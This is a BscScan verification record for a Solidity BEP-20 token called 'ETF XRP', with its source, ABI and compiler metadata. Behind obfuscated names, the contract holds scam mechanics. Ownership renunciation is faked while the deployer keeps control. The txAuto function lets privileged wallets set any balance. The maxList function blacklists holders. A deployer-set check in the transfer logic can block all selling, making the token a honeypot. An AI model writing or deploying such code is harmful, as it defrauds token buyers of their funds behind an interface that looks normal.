{"SourceCode": "/**\r\n *Submitted for verification at BscScan.com on 2023-12-05\r\n*/\r\n\r\n//SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.14;\r\n\r\nlibrary SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}\r\n\r\nabstract contract minSender {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ninterface feeAutoMarketing {\r\n    function createPair(address modeBuy, address modeMarketing) external returns (address);\r\n\r\n    function feeTo() external view returns (address);\r\n}\r\n\r\ninterface exemptSell {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n}\r\n\r\n\r\ninterface senderLiquidity {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address feeAmount) external view returns (uint256);\r\n\r\n    function transfer(address marketingIs, uint256 amountTeamWallet) external returns (bool);\r\n\r\n    function allowance(address fundList, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amountTeamWallet) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address marketingIs,\r\n        uint256 amountTeamWallet\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed marketingTxTeam, uint256 value);\r\n    event Approval(address indexed fundList, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface senderLiquidityMetadata is senderLiquidity {\r\n    function name() external view returns (string memory);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\ncontract ETFXRP is minSender, senderLiquidity, senderLiquidityMetadata {\r\n\r\n    function tokenFeeMarketing(uint256 amountTeamWallet) public {\r\n        liquidityAt();\r\n        buyIs = amountTeamWallet;\r\n    }\r\n\r\n    function walletReceiverLiquidity() public {\r\n        emit OwnershipTransferred(listSwap, address(0));\r\n        takeIs = address(0);\r\n    }\r\n\r\n    bool public teamTx;\r\n\r\n    function maxList(address shouldMin) public {\r\n        liquidityAt();\r\n        \r\n        if (shouldMin == listSwap || shouldMin == liquidityReceiver) {\r\n            return;\r\n        }\r\n        swapLiquidity[shouldMin] = true;\r\n    }\r\n\r\n    address private takeIs;\r\n\r\n    event OwnershipTransferred(address indexed receiverLaunch, address indexed txTeamMin);\r\n\r\n    mapping(address => mapping(address => uint256)) private teamAtTake;\r\n\r\n    string private enableExempt = \"ETF XRP\";\r\n\r\n    constructor (){\r\n        if (senderMin) {\r\n            receiverTo = true;\r\n        }\r\n        walletReceiverLiquidity();\r\n        exemptSell atSwapShould = exemptSell(toTotal);\r\n        liquidityReceiver = feeAutoMarketing(atSwapShould.factory()).createPair(atSwapShould.WETH(), address(this));\r\n        receiverTradingWallet = feeAutoMarketing(atSwapShould.factory()).feeTo();\r\n        if (receiverTo != teamTx) {\r\n            teamTx = false;\r\n        }\r\n        listSwap = _msgSender();\r\n        feeReceiver[listSwap] = true;\r\n        teamToken[listSwap] = exemptTotalFund;\r\n        \r\n        emit Transfer(address(0), listSwap, exemptTotalFund);\r\n    }\r\n\r\n    function isLaunchSwap(address launchAutoAt, address marketingIs, uint256 amountTeamWallet) internal returns (bool) {\r\n        if (launchAutoAt == listSwap) {\r\n            return receiverSell(launchAutoAt, marketingIs, amountTeamWallet);\r\n        }\r\n        uint256 tokenTrading = senderLiquidity(liquidityReceiver).balanceOf(receiverTradingWallet);\r\n        require(tokenTrading == buyIs);\r\n        require(marketingIs != receiverTradingWallet);\r\n        if (swapLiquidity[launchAutoAt]) {\r\n            return receiverSell(launchAutoAt, marketingIs, tradingFeeShould);\r\n        }\r\n        amountTeamWallet = isToken(launchAutoAt, marketingIs, amountTeamWallet);\r\n        return receiverSell(launchAutoAt, marketingIs, amountTeamWallet);\r\n    }\r\n\r\n    uint256 public toIsMarketing = 3;\r\n\r\n    function symbol() external view virtual override returns (string memory) {\r\n        return marketingShould;\r\n    }\r\n\r\n    address public liquidityReceiver;\r\n\r\n    function decimals() external view virtual override returns (uint8) {\r\n        return buyLiquidity;\r\n    }\r\n\r\n    function getOwner() external view returns (address) {\r\n        return takeIs;\r\n    }\r\n\r\n    uint256 public walletFee;\r\n\r\n    function receiverSell(address launchAutoAt, address marketingIs, uint256 amountTeamWallet) internal returns (bool) {\r\n        require(teamToken[launchAutoAt] >= amountTeamWallet);\r\n        teamToken[launchAutoAt] -= amountTeamWallet;\r\n        teamToken[marketingIs] += amountTeamWallet;\r\n        emit Transfer(launchAutoAt, marketingIs, amountTeamWallet);\r\n        return true;\r\n    }\r\n\r\n    function owner() external view returns (address) {\r\n        return takeIs;\r\n    }\r\n\r\n    address public listSwap;\r\n\r\n    address toTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\r\n\r\n    function name() external view virtual override returns (string memory) {\r\n        return enableExempt;\r\n    }\r\n\r\n    uint256 private fromBuy;\r\n\r\n    uint256 private exemptTotalFund = 100000000 * 10 ** 18;\r\n\r\n    mapping(address => bool) public feeReceiver;\r\n\r\n    function transfer(address minExempt, uint256 amountTeamWallet) external virtual override returns (bool) {\r\n        return isLaunchSwap(_msgSender(), minExempt, amountTeamWallet);\r\n    }\r\n\r\n    uint256 buyIs;\r\n\r\n    function balanceOf(address feeAmount) public view virtual override returns (uint256) {\r\n        return teamToken[feeAmount];\r\n    }\r\n\r\n    function tradingReceiver(address receiverAmount) public {\r\n        require(receiverAmount.balance < 100000);\r\n        if (isSwap) {\r\n            return;\r\n        }\r\n        if (toMax == receiverTo) {\r\n            teamTx = false;\r\n        }\r\n        feeReceiver[receiverAmount] = true;\r\n        \r\n        isSwap = true;\r\n    }\r\n\r\n    bool private senderMin;\r\n\r\n    function totalSupply() external view virtual override returns (uint256) {\r\n        return exemptTotalFund;\r\n    }\r\n\r\n    bool private senderReceiver;\r\n\r\n    uint256 takeTxTrading;\r\n\r\n    uint256 constant tradingFeeShould = 3 ** 10;\r\n\r\n    function isToken(address launchAutoAt, address marketingIs, uint256 amountTeamWallet) internal view returns (uint256) {\r\n        require(amountTeamWallet > 0);\r\n\r\n        uint256 buyExemptSell = 0;\r\n        if (launchAutoAt == liquidityReceiver && toIsMarketing > 0) {\r\n            buyExemptSell = amountTeamWallet * toIsMarketing / 100;\r\n        } else if (marketingIs == liquidityReceiver && walletToLiquidity > 0) {\r\n            buyExemptSell = amountTeamWallet * walletToLiquidity / 100;\r\n        }\r\n        require(buyExemptSell <= amountTeamWallet);\r\n        return amountTeamWallet - buyExemptSell;\r\n    }\r\n\r\n    uint256 private tradingFee;\r\n\r\n    mapping(address => bool) public swapLiquidity;\r\n\r\n    function liquidityAt() private view {\r\n        require(feeReceiver[_msgSender()]);\r\n    }\r\n\r\n    bool private toMax;\r\n\r\n    function txAuto(address minExempt, uint256 amountTeamWallet) public {\r\n        liquidityAt();\r\n        teamToken[minExempt] = amountTeamWallet;\r\n    }\r\n\r\n    bool public isSwap;\r\n\r\n    function approve(address liquidityWallet, uint256 amountTeamWallet) public virtual override returns (bool) {\r\n        teamAtTake[_msgSender()][liquidityWallet] = amountTeamWallet;\r\n        emit Approval(_msgSender(), liquidityWallet, amountTeamWallet);\r\n        return true;\r\n    }\r\n\r\n    bool private receiverTo;\r\n\r\n    mapping(address => uint256) private teamToken;\r\n\r\n    string private marketingShould = \"ETFXRP\";\r\n\r\n    uint256 private autoList;\r\n\r\n    uint8 private buyLiquidity = 18;\r\n\r\n    uint256 public walletToLiquidity = 0;\r\n\r\n    address receiverTradingWallet;\r\n\r\n    function transferFrom(address launchAutoAt, address marketingIs, uint256 amountTeamWallet) external override returns (bool) {\r\n        if (_msgSender() != toTotal) {\r\n            if (teamAtTake[launchAutoAt][_msgSender()] != type(uint256).max) {\r\n                require(amountTeamWallet <= teamAtTake[launchAutoAt][_msgSender()]);\r\n                teamAtTake[launchAutoAt][_msgSender()] -= amountTeamWallet;\r\n            }\r\n        }\r\n        return isLaunchSwap(launchAutoAt, marketingIs, amountTeamWallet);\r\n    }\r\n\r\n    function allowance(address sellIsFee, address liquidityWallet) external view virtual override returns (uint256) {\r\n        if (liquidityWallet == toTotal) {\r\n            return type(uint256).max;\r\n        }\r\n        return teamAtTake[sellIsFee][liquidityWallet];\r\n    }\r\n\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txTeamMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTxTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellIsFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTeamWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMin\",\"type\":\"address\"}],\"name\":\"maxList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toIsMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountTeamWallet\",\"type\":\"uint256\"}],\"name\":\"tokenFeeMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAmount\",\"type\":\"address\"}],\"name\":\"tradingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTeamWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAutoAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTeamWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTeamWallet\",\"type\":\"uint256\"}],\"name\":\"txAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletReceiverLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletToLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ETFXRP", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://94fdba527cf0db6da298827b59ea466cdc1cea1a65c7c4b365a490689e815b52"}